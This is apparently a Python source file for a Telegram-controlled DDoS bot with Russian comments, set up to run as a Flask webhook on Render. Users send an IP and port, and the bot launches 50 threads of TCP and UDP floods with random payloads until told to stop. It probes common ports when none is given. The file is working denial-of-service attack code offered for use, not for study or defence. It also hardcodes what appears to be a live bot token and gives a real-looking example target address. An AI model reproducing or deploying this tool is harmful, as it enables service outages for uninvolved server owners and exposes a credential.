#!/usr/bin/env python3
"""
DDOS BOT - TCP + UDP
ИСПРАВЛЕННАЯ ВЕРСИЯ ДЛЯ RENDER
"""

import telebot
import socket
import threading
import random
import time
import re
import os
import sys
from flask import Flask, request, jsonify

# ============ ТОКЕН ============
BOT_TOKEN = "8603622469:AAHHcTA6oV4gbcyBTqlRRU7TRY_irCZR5_Q"
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ============ НАСТРОЙКИ ============
THREADS = 50  # Меньше потоков для стабильности
active_attacks = {}

print("[*] Бот запускается...", flush=True)

# ============ АТАКИ ============
def tcp_attack(ip, port, stop_flag):
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, port))
            sock.send(random._urandom(512))
            sock.close()
        except:
            pass
        time.sleep(0.01)

def udp_attack(ip, port, stop_flag):
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(random._urandom(512), (ip, port))
            sock.close()
        except:
            pass
        time.sleep(0.01)

# ============ МЕНЕДЖЕР ============
class AttackManager:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.stop_flag = threading.Event()
        self.threads = []
        self.start_time = None
    
    def start(self):
        self.start_time = time.time()
        tcp_count = THREADS // 2
        udp_count = THREADS // 2
        
        for i in range(tcp_count):
            t = threading.Thread(target=tcp_attack, args=(self.ip, self.port, self.stop_flag))
            t.daemon = True
            self.threads.append(t)
            t.start()
        
        for i in range(udp_count):
            t = threading.Thread(target=udp_attack, args=(self.ip, self.port, self.stop_flag))
            t.daemon = True
            self.threads.append(t)
            t.start()
    
    def stop(self):
        self.stop_flag.set()
    
    def duration(self):
        return int(time.time() - self.start_time) if self.start_time else 0

# ============ ПАРСИНГ ============
def parse_target(text):
    match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})', text)
    if match:
        return match.group(1), int(match.group(2))
    match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', text)
    if match:
        return match.group(1), None
    return None, None

def scan_port(ip):
    ports = [15455, 9339, 443, 80, 8080]
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, port))
            sock.close()
            return port
        except:
            continue
    return 80

# ============ КОМАНДЫ БОТА ============
@bot.message_handler(commands=['start'])
def start_cmd(message):
    bot.reply_to(message,
        "💀 *DDOS BOT* 💀\n\n"
        "📌 Отправь IP:PORT\n"
        "📝 Пример: `43.158.103.205:15455`\n\n"
        "🛑 `stop` - остановка\n\n"
        "🔥 TCP + UDP атаки",
        parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text and m.text.lower() == 'stop')
def stop_cmd(message):
    cid = message.chat.id
    if cid in active_attacks:
        active_attacks[cid].stop()
        bot.reply_to(message, f"🛑 *Атака остановлена*", parse_mode="Markdown")
        del active_attacks[cid]
    else:
        bot.reply_to(message, "💤 *Нет активной атаки*", parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text and re.search(r'\d+\.\d+\.\d+\.\d+', m.text))
def attack_cmd(message):
    cid = message.chat.id
    ip, port = parse_target(message.text)
    
    if not ip:
        bot.reply_to(message, "❌ *Неверный IP*", parse_mode="Markdown")
        return
    
    if cid in active_attacks:
        bot.reply_to(message, "⚠️ *Атака уже идет! Отправь stop*", parse_mode="Markdown")
        return
    
    if not port:
        port = scan_port(ip)
    
    attack = AttackManager(ip, port)
    attack.start()
    active_attacks[cid] = attack
    
    bot.reply_to(message,
        f"💀 *АТАКА ЗАПУЩЕНА* 💀\n\n"
        f"📍 `{ip}:{port}`\n"
        f"⚡ TCP: {THREADS//2} потоков\n"
        f"⚡ UDP: {THREADS//2} потоков\n"
        f"🛑 *stop* - остановка",
        parse_mode="Markdown")

@bot.message_handler(func=lambda m: True)
def unknown(m):
    bot.reply_to(m, "💀 Отправь IP:PORT\nПример: 43.158.103.205:15455\n\nstop - остановка")

# ============ WEBHOOK ============
@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST', 'GET'])
def webhook():
    if request.method == 'GET':
        return 'Webhook is working! Send POST requests.', 200
    
    try:
        update = telebot.types.Update.de_json(request.stream.read().decode('utf-8'))
        bot.process_new_updates([update])
        return 'ok', 200
    except Exception as e:
        print(f"Webhook error: {e}", flush=True)
        return 'error', 500

@app.route('/', methods=['GET'])
def index():
    return '✅ DDOS BOT IS RUNNING! Send IP:PORT to @' + (bot.get_me().username if hasattr(bot, 'get_me') else 'bot'), 200

@app.route('/health', methods=['GET'])
def health():
    return 'OK', 200

# ============ ЗАПУСК ============
if __name__ == "__main__":
    print("=" * 50, flush=True)
    print("DDOS BOT STARTING...", flush=True)
    print("=" * 50, flush=True)
    
    # Установка вебхука
    RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://hostingj.onrender.com")
    webhook_url = f"{RENDER_URL}/webhook/{BOT_TOKEN}"
    
    print(f"[*] Render URL: {RENDER_URL}", flush=True)
    print(f"[*] Webhook URL: {webhook_url}", flush=True)
    
    try:
        bot.remove_webhook()
        print("[*] Webhook removed", flush=True)
        bot.set_webhook(url=webhook_url)
        print(f"[+] Webhook set to {webhook_url}", flush=True)
    except Exception as e:
        print(f"[!] Webhook error: {e}", flush=True)
    
    port = int(os.environ.get("PORT", 8080))
    print(f"[*] Starting Flask on port {port}...", flush=True)
    
    # Запуск Flask без debug (важно для Render)
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True) 
